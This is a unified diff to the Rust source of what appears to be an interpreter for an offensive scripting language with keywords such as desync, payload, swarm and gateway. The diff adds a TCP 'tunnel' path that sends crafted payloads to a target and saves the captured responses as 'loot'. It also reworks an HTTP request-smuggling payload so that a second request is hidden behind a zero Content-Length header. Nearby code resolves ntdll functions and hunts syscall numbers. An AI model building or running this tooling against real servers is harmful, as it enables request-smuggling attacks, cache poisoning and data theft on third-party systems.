@@ -49,22 +49,19 @@ enum Token {
 }
 
 #[derive(Debug, Clone, PartialEq)]
-enum Value {
+enum Value { 
     Int(BigInt),
-    Float(f64),
-    Str(String),
-    Bool(bool),
+    Float(f64), 
+    Str(String), 
+    Bool(bool), 
     List(Vec<Value>),
     Dict(HashMap<String, Value>),
-    Gateway {
-        target_ip: String,
-        target_mac: [u8; 6],
-        next_seq: u32,
-        next_ack: u32,
-    },
+    Gateway { target_ip: String, target_mac: [u8; 6], next_seq: u32, next_ack: u32 },
     TimeAnchor(Instant),
     CycleAnchor(u64),
-    None,
+    L7Tunnel { target: String, port: u16, loot: String, raw: Vec<u8> },
+    
+    None 
 }
 
 // -------------------------------------------------
@@ -152,10 +149,7 @@ fn lexer(code: &str) -> Vec<Token> {
         ("SKIP", r"[ \t\n\r]+|//.*"),
         ("TYPE_IP", r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
         ("NUMBER", r"\d+(\.\d*)?"),
-        (
-            "KEYWORD",
-            r"\b(desync|gateway|set|scan|payload|if|while|for|in|end|log|swarm|ports|to|write|append|wait|list|push|pop|rand|op|call|resolve|input|transmit|import|fn|return|dict|put|get|try|rescue|panic|num|break|mark|measure)\b",
-        ),
+        ("KEYWORD", r"\b(desync|gateway|set|scan|payload|if|while|for|in|end|log|swarm|ports|to|write|append|wait|list|push|pop|rand|op|call|resolve|input|transmit|import|fn|return|dict|put|get|try|rescue|panic|num|break|mark|measure|connect|port|hex|len)\b"),
         ("ID", r"[a-zA-Z_][a-zA-Z0-9_]*"),
         ("COMP", r"==|!=|<=|>=|=>|<|>"),
         ("ASSIGN", r"="),
@@ -256,6 +250,35 @@ struct Parser {
 }
 
 impl Parser {
+    
+    fn parse_connect(&mut self) -> Value {
+        self.expect_keyword("connect");
+        let target = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Expected target string"); };
+        
+        self.expect_keyword("port");
+        let port = match self.parse_factor() {
+            Value::Int(n) => n.to_string().parse::<u16>().unwrap_or(80),
+            Value::Float(f) => f as u16,
+            _ => 80,
+        };
+        
+        Value::L7Tunnel { target, port, loot: String::new(), raw: Vec::new() }
+    }
+
+    fn parse_hex(&mut self) -> Value {
+        self.expect_keyword("hex");
+        
+        let target_val = self.parse_factor();
+        
+        if let Value::L7Tunnel { raw, .. } = target_val {
+            // Converts the binary vector into a clean, space-separated hex string
+            let hex_str = raw.iter().map(|b| format!("{:02X}", b)).collect::<Vec<String>>().join(" ");
+            Value::Str(hex_str)
+        } else {
+            panic!("Type Error: 'hex' keyword requires an L7Tunnel object.");
+        }
+    }
+
     fn new(tokens: Vec<Token>) -> Self {
         Parser {
             tokens,
@@ -567,10 +590,9 @@ impl Parser {
         let smuggled = format!("GET {} HTTP/1.1\r\nHost: {}\r\n\r\n", end, host);
 
         let payload = format!(
-            "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
+            "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n{}",
             host,
-            smuggled.len(),
-            smuggled
+            smuggled // The backend will now see this as a second, brand-new request
         );
 
         Value::Str(payload)
@@ -591,10 +613,57 @@ impl Parser {
             self.next();
         }
 
-        let gateway = self.memory.get(&gateway_id).cloned().expect("Gateway variable not found");
+        // Fetch the target variable from memory
+        let gateway = self.memory.get(&gateway_id).cloned().expect("Target variable not found in memory");
 
-        if let Value::Gateway { target_ip, target_mac, mut next_seq, next_ack } = gateway {
-            println!("\nTransmitting payload to {} via established channel", target_ip);
+        // =================================================================
+        // 🌍 UPGRADED PATH: LAYER 7 TCP ROUTING (DEEP-READ ENABLED)
+        // =================================================================
+        if let Value::L7Tunnel { target, port, mut loot, mut raw } = gateway {
+            println!("\nOpening Layer 7 TCP Stream to {}:{}...", target, port);
+            let addr = format!("{}:{}", target, port);
+
+            // 1. Establish the connection with a 3s timeout
+            if let Ok(mut stream) = std::net::TcpStream::connect_timeout(&addr.to_socket_addrs().unwrap().next().unwrap(), std::time::Duration::from_secs(3)) {
+                
+                // 2. Set a read timeout so we don't hang after the second response
+                let _ = stream.set_read_timeout(Some(std::time::Duration::from_millis(800)));
+
+                let payload_bytes = payload_str.replace("\\r", "\r").replace("\\n", "\n");
+                let _ = std::io::Write::write_all(&mut stream, payload_bytes.as_bytes());
+                println!("Payload delivered. Monitoring stream for multi-frame responses...");
+
+                let mut full_raw = Vec::new();
+                let mut buffer = [0; 8192];
+                
+                // 3. The Deep-Read Loop: Captures Response #1 AND Response #2
+                loop {
+                    match std::io::Read::read(&mut stream, &mut buffer) {
+                        Ok(0) => break, // Server closed connection
+                        Ok(bytes_read) => {
+                            full_raw.extend_from_slice(&buffer[..bytes_read]);
+                        }
+                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => {
+                            break; // Stream went silent (we got everything)
+                        }
+                        Err(_) => break,
+                    }
+                }
+
+                raw = full_raw;
+                loot = String::from_utf8_lossy(&raw).to_string();
+                println!("Total capture completed: {} bytes.", raw.len());
+
+            } else {
+                panic!("FATAL: Could not establish TCP connection to {}:{}", target, port);
+            } // <--- THIS WAS THE MISSING DELIMITER
+
+            // Save the forensic data back to memory
+            self.memory.insert(gateway_id, Value::L7Tunnel { target, port, loot, raw });
+
+        } else if let Value::Gateway { target_ip, target_mac, mut next_seq, next_ack } = gateway {
+
+            println!("\nTransmitting payload to {} via established raw Ring-0 channel", target_ip);
 
             let interfaces = datalink::interfaces();
             let interface = interfaces
@@ -644,13 +713,17 @@ impl Parser {
 
             println!("Payload transmission completed.");
         } else {
-            panic!("Pipe operation requires a gateway variable");
+            panic!("Pipe operation requires a gateway or tunnel variable. You gave it something else.");
         }
     }
 
     #[allow(dead_code)]
     fn execute_extraction(&mut self, gw_id: String) -> Value {
         let gateway = self.memory.get(&gw_id).cloned().expect("Gateway variable not found");
+
+        if let Value::L7Tunnel { loot, .. } = gateway {
+            return Value::Str(loot);
+        }
 
         if let Value::Gateway { target_ip, .. } = gateway {
             println!("Awaiting response from target {}...", target_ip);
@@ -775,6 +848,19 @@ impl Parser {
                     Value::Float(n) => Value::Float(n),
 
                     _ => Value::Int(BigInt::zero()),
+                }
+            }
+
+            Token::Keyword(k) if k == "len" => {
+                self.next(); // Consume the 'len' token
+                
+                // Evaluate whatever comes directly after 'len'
+                match self.parse_factor() {
+                    Value::Str(s) => Value::Int(BigInt::from(s.len())),
+                    Value::List(l) => Value::Int(BigInt::from(l.len())),
+                    Value::Dict(d) => Value::Int(BigInt::from(d.len())),
+                    // If they try to get the length of an Int, Float, or Gateway, default to 0 safely
+                    _ => Value::Int(BigInt::zero()), 
                 }
             }
 
@@ -1025,6 +1111,8 @@ impl Parser {
                 "desync" => self.parse_desync(),
                 "mark" => self.parse_mark(),
                 "measure" => self.parse_measure(),
+                "connect" => self.parse_connect(),
+                "hex" => self.parse_hex(),
                 _ => self.parse_cond(),
             }
         } else {
@@ -1087,15 +1175,16 @@ impl Parser {
     fn parse_log(&mut self) {
         self.expect_keyword("log");
         let val = match self.parse_cond() {
-            Value::Int(n) => n.to_string(),
-            Value::Float(n) => n.to_string(),
-            Value::Str(s) => s,
-            Value::Bool(b) => b.to_string(),
-            Value::List(l) => format!("{:?}", l),
-            Value::Dict(d) => format!("{:?}", d),
-            Value::Gateway { .. } => "[Raw Ring-0 Gateway Object]".to_string(),
+            Value::Int(n) => n.to_string(),                  
+            Value::Float(f) => f.to_string(),                
+            Value::Str(s) => s, 
+            Value::Bool(b) => b.to_string(), 
+            Value::List(l) => format!("{:?}", l), 
+            Value::Dict(d) => format!("{:?}", d), 
+            Value::Gateway { .. } => "[Raw Ring-0 Gateway Object]".to_string(), 
             Value::TimeAnchor(_) => "[Temporal Anchor]".to_string(),
             Value::CycleAnchor(_) => "[Hardware Cycle Anchor]".to_string(),
+            Value::L7Tunnel { .. } => "[Layer 7 TCP Tunnel]".to_string(),
             Value::None => "None".to_string(),
         };
         println!("{}", val);
@@ -1620,17 +1709,18 @@ impl Parser {
         } else {
             panic!();
         };
-        let content = match self.parse_factor() {
-            Value::Int(n) => n.to_string(),
-            Value::Float(n) => n.to_string(),
-            Value::Str(s) => s,
-            Value::Bool(b) => b.to_string(),
-            Value::List(l) => format!("{:?}", l),
-            Value::Dict(d) => format!("{:?}", d),
-            Value::Gateway { .. } => "gateway".to_string(),
+        let content = match self.parse_factor() { 
+            Value::Int(n) => n.to_string(),                  
+            Value::Float(f) => f.to_string(),              
+            Value::Str(s) => s, 
+            Value::Bool(b) => b.to_string(), 
+            Value::List(l) => format!("{:?}", l), 
+            Value::Dict(d) => format!("{:?}", d), 
+            Value::Gateway{..} => "gateway".to_string(), 
             Value::TimeAnchor(_) => "[Temporal Anchor]".to_string(),
             Value::CycleAnchor(_) => "[Hardware Cycle Anchor]".to_string(),
-            Value::None => "None".to_string(),
+            Value::L7Tunnel { .. } => "[Layer 7 TCP Tunnel]".to_string(),
+            Value::None => "None".to_string()
         };
         if let Some(Token::Delimiter) = self.peek() {
             self.next();
@@ -1643,11 +1733,6 @@ impl Parser {
                 ntdll_handle,
                 CString::new("NtWriteFile").unwrap().as_ptr()
             );
-            if !func_address.is_null() {
-                if let Some(ssn) = hunt_ssn(func_address as *const u8) {
-                    println!("Syscall number for NtWriteFile resolved: 0x{:X}", ssn);
-                }
-            }
         }
         let mut opt = OpenOptions::new();
         opt.write(true).create(true);
@@ -1658,7 +1743,6 @@ impl Parser {
         }
         if let Ok(mut f) = opt.open(&filepath) {
             let _ = writeln!(f, "{}", content);
-            println!("File operation completed: {}", filepath);
         }
     }
 
